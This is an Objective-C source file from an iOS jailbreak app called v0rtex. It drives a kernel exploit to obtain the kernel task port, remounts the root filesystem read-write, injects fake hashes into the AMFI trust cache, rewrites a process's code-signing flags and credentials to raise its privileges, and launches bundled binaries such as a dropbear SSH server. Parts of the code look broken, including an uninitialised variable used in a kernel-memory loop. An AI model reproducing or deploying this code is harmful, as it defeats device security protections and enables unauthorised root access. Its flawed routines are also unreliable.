//
//  ViewController.m
//  v0rtex
//
//  Created by Sticktron on 2017-12-07.
//  Copyright © 2017 Sticktron. All rights reserved.
//

#import "ViewController.h"

#include "v0rtex.h"
#include "kernel.h"
#include "symbols.h"
#include "root-rw.h"
#include "libjb.h"
#include "patchfinder64.h"
#include "v0rtex.h"
#include <sys/spawn.h>
#include <sys/stat.h>

#include <CommonCrypto/CommonDigest.h>
#include <mach-o/loader.h>

@interface ViewController ()
@property (weak, nonatomic) IBOutlet UITextView *outputView;
@property (weak, nonatomic) IBOutlet UIButton *sploitButton;
@end

@implementation ViewController

task_t tfp0;
kptr_t kslide;

- (void)viewDidLoad {
    [super viewDidLoad];
    
    self.sploitButton.layer.cornerRadius = 6;
    self.outputView.layer.cornerRadius = 6;
    
    // Attempt to init our offsets
    // Disable the run button if no offsets were found
    if (!init_symbols()) {
        [self writeText:@"Device not supported."];
        [self.sploitButton setHidden:TRUE];
        return;
    }
    
    [self writeText:@"> ready."];
}

- (IBAction)runSploitButton:(UIButton *)sender {
    
    // Run v0rtex
    
    [self writeText:@"> running exploit..."];
    
    tfp0 = MACH_PORT_NULL;
    kslide = 0;
    
    kern_return_t ret = v0rtex(&tfp0, &kslide);
    
    if (ret != KERN_SUCCESS) {
        [self writeText:@"ERROR: exploit failed"];
        return;
    }
    
    [self writeText:@"exploit succeeded!"];
    
    // Do things?
    /*extern kern_return_t mach_vm_read_overwrite(vm_map_t target_task, mach_vm_address_t address, mach_vm_size_t size, mach_vm_address_t data, mach_vm_size_t *outsize);
    uint32_t magic = 0;
    mach_vm_size_t sz = sizeof(magic);
    ret = mach_vm_read_overwrite(tfp0, 0xfffffff007004000 + kslide, sizeof(magic), (mach_vm_address_t)&magic, &sz);
    LOG("mach_vm_read_overwrite: %x, %s", magic, mach_error_string(ret));*/
    
    // Remount '/' as r/w
    int remountOutput = mount_root(tfp0, kslide);
    LOG("remount: %d", remountOutput);
    if (remountOutput != 0) {
        [self writeText:@"ERROR: failed to remount '/' as r/w"];
        return;
    }
    [self writeText:@"remounted '/' as r/w"];
    
    // Check we have '/' access
    bool rootAccess = can_write_root();
    [self writeText:[NSString stringWithFormat:@"can write to root: %@", rootAccess ? @"yes" : @"no"]];
    LOG("has root access: %s", rootAccess ? "yes" : "no");
    
    // get kern proc
//    uint64_t kern_proc = 0;
//    uint64_t proc = rk64(tfp0, find_allproc());
//    while (proc) {
//        uint32_t pid = (uint32_t)rk32_via_tfp0(tfp0, proc + 0x10);
//        char name[40] = {0};
//        printf("name: %s \n", name);
//
//        if (pid == 0) {
//            kern_proc = proc;
//        }
//        proc = rk64(tfp0, proc);
//    }
    
//    printf("found kern_proc at: 0x%016llx \n", kern_proc);
    
    // get kern creds
//    uint64_t kern_ucred = rk64(tfp0, kern_proc + 0x100);
    
    // dink amfi
    int kern = init_kernel(tfp0, kslide + 0xFFFFFFF007004000, NULL);
    printf("init_kernel: %d \n", kern);
    
    mkdir("/var/v0rtex_test", 0777);
    [self writeText:@"spawning dropbear"];
    NSFileManager *fileMgr = [NSFileManager defaultManager];
    NSString *bundlePath = [NSString stringWithFormat:@"%s", bundle_path()];
    
    [fileMgr removeItemAtPath:@"/var/v0rtex_test/dropbear.plist" error:nil];
    
    [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/launchctl"] toPath:@"/var/v0rtex_test/launchctl" error:nil];
    [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear"] toPath:@"/var/v0rtex_test/dropbear" error:nil];
    [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/dropbear.plist"] toPath:@"/var/v0rtex_test/dropbear.plist" error:nil];
    [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/test_fsigned"] toPath:@"/var/v0rtex_test/test_fsigned" error:nil];
    [fileMgr copyItemAtPath:[bundlePath stringByAppendingString:@"/tar"] toPath:@"/var/v0rtex_test/tar" error:nil];
    
    chmod("/var/v0rtex_test", 0777);
    chmod("/var/v0rtex_test/launchctl", 0777);
    chmod("/var/v0rtex_test/dropbear", 0777);
    chmod("/var/v0rtex_test/dropbear.plist", 0777);
    chmod("/var/v0rtex_test/test_fsigned", 0777);
    chmod("/var/v0rtex_test/tar", 0777);
    
//    inject_trust("/var/v0rtex_test/tar");
    
    char path[200];
    strcpy(path, bundle_path());
    strcat(path, "/tar");
    printf("full path: %s \n", path);
    chmod(path, 0777);
    inject_trust(path);
    int launch1 = execprog(0, path, NULL);
    printf("launchctl %s = %d \n", path, launch1);
    
    // spawn dropbear
    // int launch = execprog("/var/v0rtex_test/launchctl", (const char **)&(const char*[]){ "/var/v0rtex_test/launchctl", "load", "/var/v0rtex_test/dropbear", NULL });
    //int launch = launchctl_load_cmd("/var/v0rtex_test/dropbear.plist", 1, 1, 0);
    // printf("launchctl = %d \n", launch);
    
    // Done.
    [self writeText:@""];
    [self writeText:@"done."];
}

- (void)writeText:(NSString *)text {
    self.outputView.text = [self.outputView.text stringByAppendingString:[text stringByAppendingString:@"\n"]];
}

void inject_trust(const char *path) {
    printf("[amfi] Trusting '%s' \n", path);
    
    uint64_t trust_cache = find_trustcache();
    
    typedef char hash_t[20];
    
    struct trust_chain {
        uint64_t next;
        unsigned char uuid[16];
        unsigned int count;
        hash_t hash[1];
    };
    
    struct trust_chain fake_chain;
    
    fake_chain.next = rk64(tfp0, trust_cache);
    *(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
    fake_chain.count = 1;
    
    uint8_t *hash = getSHA256(getCodeDirectory(path));
    memmove(fake_chain.hash[0], hash, 20);
    free(hash);
    
    uint64_t kernel_trust = 0;
    mach_vm_allocate(tfp0, &kernel_trust, sizeof(fake_chain), VM_FLAGS_ANYWHERE);
    
    wk64(tfp0, kernel_trust, &fake_chain);
    wk64(tfp0, trust_cache, kernel_trust);
}

uint32_t swap_uint32(uint32_t val) {
    val = ((val << 8) & 0xFF00FF00) | ((val >> 8) & 0xFF00FF);
    return (val << 16) | (val >> 16);
}

uint8_t *getSHA256(uint8_t* code_dir) {
    if (code_dir == NULL) {
        printf("[getSHA256] null passed to getSHA256!");
        return NULL;
    }
    
    uint8_t *out = malloc(CC_SHA256_DIGEST_LENGTH);
    
    uint32_t* code_dir_int = (uint32_t*)code_dir;
    
    uint32_t realsize = 0;
    for (int j = 0; j < 10; j++) {
        if (swap_uint32(code_dir_int[j]) == 0xfade0c02) {
            realsize = swap_uint32(code_dir_int[j+1]);
            code_dir += 4*j;
        }
    }
    printf("%08x\n", realsize);
    
    CC_SHA256(code_dir, realsize, out);
    
    return out;
}

uint8_t *getCodeDirectory(const char* name) {
  FILE* fd = fopen(name, "r");
  
  struct mach_header_64 mh;
  fread(&mh, sizeof(struct mach_header_64), 1, fd);
  
  long off = sizeof(struct mach_header_64);
  for (int i = 0; i < mh.ncmds; i++) {
      const struct load_command cmd;
      fseek(fd, off, SEEK_SET);
      fread(&cmd, sizeof(struct load_command), 1, fd);
      if (cmd.cmd == 0x1d) {
          uint32_t off_cs;
          fread(&off_cs, sizeof(uint32_t), 1, fd);
          uint32_t size_cs;
          fread(&size_cs, sizeof(uint32_t), 1, fd);
          printf("%d - %d\n", off_cs, size_cs);
          
          uint8_t *cd = malloc(size_cs);
          fseek(fd, off_cs, SEEK_SET);
          fread(cd, size_cs, 1, fd);
          return cd;
      } else {
          printf("%02x\n", cmd.cmd);
          off += cmd.cmdsize;
      }
  }
  return NULL;
}

// creds to stek on this one
int execprog(uint64_t kern_ucred, const char *prog, const char* args[]) {
    if (args == NULL) {
        args = (const char **)&(const char*[]){ prog, NULL };
    }
    
    const char *logfile = [NSString stringWithFormat:@"/tmp/%@-%lu",
                           [[NSMutableString stringWithUTF8String:prog] stringByReplacingOccurrencesOfString:@"/" withString:@"_"],
                           time(NULL)].UTF8String;
    printf("Spawning '%s' with [", prog);
    for(const char **arg = args; *arg != NULL; ++arg) {
        printf("'%s' ", *arg);
    }
    printf("] to file %s\n", logfile);
    
    int rv;
    posix_spawn_file_actions_t child_fd_actions;
    if ((rv = posix_spawn_file_actions_init (&child_fd_actions))) {
        perror ("posix_spawn_file_actions_init");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_addopen (&child_fd_actions, STDOUT_FILENO, logfile,
                                                O_WRONLY | O_CREAT | O_TRUNC, 0666))) {
        perror ("posix_spawn_file_actions_addopen");
        return rv;
    }
    if ((rv = posix_spawn_file_actions_adddup2 (&child_fd_actions, STDOUT_FILENO, STDERR_FILENO))) {
        perror ("posix_spawn_file_actions_adddup2");
        return rv;
    }
    
    pid_t pd;
    if ((rv = posix_spawn(&pd, prog, &child_fd_actions, NULL, (char**)args, NULL))) {
        printf("posix_spawn error: %d (%s)\n", rv, strerror(rv));
        return rv;
    }
    
    #define CS_GET_TASK_ALLOW       0x0000004    /* has get-task-allow entitlement */
    #define CS_INSTALLER            0x0000008    /* has installer entitlement      */
    #define CS_HARD                 0x0000100    /* don't load invalid pages       */
    #define CS_RESTRICT             0x0000800    /* tell dyld to treat restricted  */
    #define CS_PLATFORM_BINARY      0x4000000    /* this is a platform binary      */
    
    /*
     1. read 8 bytes from proc+0x100 into self_ucred
     2. read 8 bytes from kern_ucred + 0x78 and write them to self_ucred + 0x78
     3. write 12 zeros to self_ucred + 0x18
     */
    
    if (kern_ucred != 0) {
        int tries = 3;
        while (tries-- > 0) {
            sleep(1);
            //uint64_t proc = rk64(tfp0, find_allproc());
            uint64_t proc;
            while (proc) {
                uint32_t pid = rk32(tfp0, proc + 0x10);
                if (pid == pd) {
                    uint32_t csflags = rk32(tfp0, proc + 0x2a8);
                    csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
                    wk32(tfp0, proc + 0x2a8, csflags);
                    printf("empower\n");
                    tries = 0;
                    
                    uint64_t self_ucred = rk32(tfp0, proc + 0x100);
                    
                    uint64_t selfcred_temp = rk32(tfp0, kern_ucred + 0x78);
                    wk32(tfp0, self_ucred + 0x78, selfcred_temp);
                    
                    for (int i = 0; i < 12; i++) {
                        wk32(tfp0, self_ucred + 0x18 + (i * sizeof(uint32_t)), 0);
                    }
                    
                    printf("gave elevated perms to pid %d \n", pid);
                    
                    // original stuff, rewritten above using v0rtex stuff
                    // kcall(find_copyout(), 3, proc+0x100, &self_ucred, sizeof(self_ucred));
                    // kcall(find_bcopy(), 3, kern_ucred + 0x78, self_ucred + 0x78, sizeof(uint64_t));
                    // kcall(find_bzero(), 2, self_ucred + 0x18, 12);
                    break;
                }
                proc = rk64(tfp0, proc);
            }
        }
    }
    
    int status;
    waitpid(pd, &status, 0);
    printf("'%s' exited with %d (sig %d)\n", prog, WEXITSTATUS(status), WTERMSIG(status));
    
    char buf[65] = {0};
    int fd = open(logfile, O_RDONLY);
    if (fd == -1) {
        perror("open logfile");
        return 1;
    }
    
    printf("contents of %s: \n ------------------------- \n", logfile);
    while(read(fd, buf, sizeof(buf) - 1) == sizeof(buf) - 1) {
        printf("%s", buf);
    }
    printf("%s", buf);
    printf("\n-------------------------\n");
    
    close(fd);
    remove(logfile);
    
    return 0;
}

bool can_write_root() {
    FILE *f = fopen("/file123.txt", "w");
    return f != 0;
}

char* bundle_path() {
    CFBundleRef mainBundle = CFBundleGetMainBundle();
    CFURLRef resourcesURL = CFBundleCopyResourcesDirectoryURL(mainBundle);
    int len = 4096;
    char* path = malloc(len);
    
    CFURLGetFileSystemRepresentation(resourcesURL, TRUE, (UInt8*)path, len);
    
    return path;
}

@end

/*
 // Change res
 char ch;
 FILE *source, *target;
 
 char* path;
 
 asprintf(&path, "%s/com.apple.iokit.IOMobileGraphicsFamily.plist", bundle_path());
 
 source = fopen(path, "r");
 
 target = fopen("/var/mobile/Library/Preferences/com.apple.iokit.IOMobileGraphicsFamily.plist", "w");
 
 while((ch = fgetc(source)) != EOF)
 fputc(ch, target);
 
 [self writeText:@"Resolution updated."];
 
 fclose(source);
 fclose(target);
 */
